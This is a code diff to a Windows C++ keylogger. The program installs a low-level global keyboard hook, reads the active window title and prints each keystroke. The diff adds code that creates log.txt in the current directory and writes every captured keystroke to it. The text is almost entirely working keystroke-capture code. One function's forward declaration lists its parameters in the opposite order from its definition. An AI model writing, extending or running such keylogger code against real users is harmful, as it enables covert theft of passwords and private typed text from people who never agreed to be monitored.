@@ -1,12 +1,25 @@
 #include <iostream>
+#include <string>
 #include <windows.h>
 #include <strsafe.h>
 
+#define BUFSIZE MAX_PATH
+
+HANDLE _loggingFile;
+
 LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);
+HANDLE CreateNewLoggingFile();
+void WriteToLoggingFile(std::string, HANDLE);
 HHOOK KeyboardHook;
 
 int main(int argc, char* argv[])
 {
+	_loggingFile = CreateNewLoggingFile();
+	if (_loggingFile == INVALID_HANDLE_VALUE)
+	{
+		std::cout << "Could not get file handle error: " << GetLastError() << std::endl;
+	}
+	
     KeyboardHook = SetWindowsHookExA(
             WH_KEYBOARD_LL,
             KeyboardProc,
@@ -25,6 +38,42 @@ int main(int argc, char* argv[])
             DispatchMessage(&msg);
         }
     }
+
+	CloseHandle(_loggingFile);
+    return 0;
+}
+
+HANDLE CreateNewLoggingFile()
+{
+	TCHAR buffer[BUFSIZE];
+	GetCurrentDirectory(BUFSIZE, buffer);
+	std::wstring wstr = buffer;
+
+	const std::string fileString = (std::string(wstr.begin(), wstr.end()) + "\\log.txt");
+	const LPCSTR file_name = fileString.c_str();
+
+	return CreateFileA(
+        file_name,
+        GENERIC_WRITE,
+        0,
+        nullptr,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
+	);
+}
+
+void WriteToLoggingFile(const HANDLE file, const std::string& text)
+{
+	DWORD dwBytesToWrite = strlen(text.c_str());
+	const LPCVOID lpBuffer = text.c_str();
+	
+	WriteFile(
+		file,
+		lpBuffer,
+		dwBytesToWrite,
+		&dwBytesToWrite,
+	nullptr);
 }
 
 std::string GetKeyboardString(DWORD code, BOOL caps, BOOL shift)
@@ -186,7 +235,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     	KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
         char cWindow[1000];
         int c = GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
-        std::cout << "Key pressed: " << GetKeyboardString(p->vkCode, caps, FALSE) << std::endl;
+    	std::string keyPressedString = GetKeyboardString(p->vkCode, caps, FALSE); 
+        std::cout << "Key pressed: " << keyPressedString << std::endl;
+    	WriteToLoggingFile(_loggingFile,  keyPressedString);
     }
     
     return CallNextHookEx(KeyboardHook, nCode, wParam, lParam); 
